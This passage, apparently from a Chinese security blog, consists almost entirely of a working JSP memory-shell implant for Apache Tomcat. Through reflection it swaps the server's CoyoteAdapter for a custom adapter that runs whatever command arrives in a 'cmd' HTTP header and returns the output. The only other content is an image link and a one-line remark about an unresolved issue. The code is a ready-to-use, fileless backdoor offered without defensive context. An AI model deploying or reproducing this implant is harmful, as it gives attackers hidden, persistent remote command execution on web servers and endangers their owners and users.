```
<%@ page import="org.apache.catalina.connector.CoyoteAdapter" %>
<%@ page import="org.apache.coyote.http11.Http11Processor" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.tomcat.util.net.NioEndpoint" %>
<%@ page import="org.apache.tomcat.util.net.NioChannel" %>
<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="java.util.Set" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.nio.charset.StandardCharsets" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    public static void setFiled(Object object, Class clazz, String filed_Name, Object value) {
    Field flied = null;
    try {
    flied = clazz.getDeclaredField(filed_Name);
    flied.setAccessible(true);
    flied.set(object, value);
    } catch (NoSuchFieldException e) {
    throw new RuntimeException(e);
    } catch (IllegalAccessException e) {
    throw new RuntimeException(e);
    }
    }
    public static Object getField(Object object, Class clazz, String fieldName) {
        Field declaredField;
        try {
            declaredField = clazz.getDeclaredField(fieldName);
            declaredField.setAccessible(true);
            return declaredField.get(object);
        } catch (NoSuchFieldException e) {
        } catch (IllegalAccessException e) {
        }
        return null;
    }
    public static Object getHttp11Processor() {
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread threads[] = (Thread[]) getField(threadGroup, threadGroup.getClass(), "threads");
        for(Thread thread:threads){
            Object o=getField(thread, thread.getClass(), "target");
            if(null!=o&&o instanceof  NioEndpoint.Poller){
                NioEndpoint.Poller target=( NioEndpoint.Poller)o;
                NioEndpoint nioEndpoint = (NioEndpoint) getField(target, target.getClass(), "this$0");
                Set<SocketWrapperBase<NioChannel>> connections = nioEndpoint.getConnections();
                for (SocketWrapperBase<NioChannel> c : connections) {
                    Object currentProcessor = c.getCurrentProcessor();
                    if (null != currentProcessor) {
                        return currentProcessor;
                    }
                }
            }

        }
        return new Object();
    }
%>

<%!
public class MyAdapter extends CoyoteAdapter {

public MyAdapter(Connector connector) {
super(connector);
}

public void exec(String p, org.apache.coyote.Response res) {
try {
    Runtime rt = Runtime.getRuntime();
    Process process = rt.exec(p);
    java.io.InputStream in = process.getInputStream();
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = "";
    String tmp = "";
    while ((tmp = stdInput.readLine()) != null) {
        s += tmp;
    }
    byte[] result = new byte[0];
    if (s != "") {
        result = s.getBytes(StandardCharsets.UTF_8);
    }
    res.doWrite(ByteBuffer.wrap(result));
} catch (Exception e) {
}
}


@Override
public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) throws Exception {
System.out.println("success !");
String p = req.getHeader("cmd");
if(null!=p){
exec(p, res);
}else {
//调用父类service方法
super.service(req, res);
}

}
}
%>
<%
    Http11Processor http11Processor = (Http11Processor) getHttp11Processor();
    CoyoteAdapter adapter = (CoyoteAdapter) http11Processor.getAdapter();
    Connector connector = (Connector) getField(adapter, adapter.getClass(), "connector");
    MyAdapter adapterMem = new MyAdapter(connector);
    setFiled(http11Processor, http11Processor.getClass().getSuperclass(), "adapter", adapterMem);
%>
```

![image-20240716150520660](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240716150520660.png)

记录一下问题，暂时没搞清楚是什么原因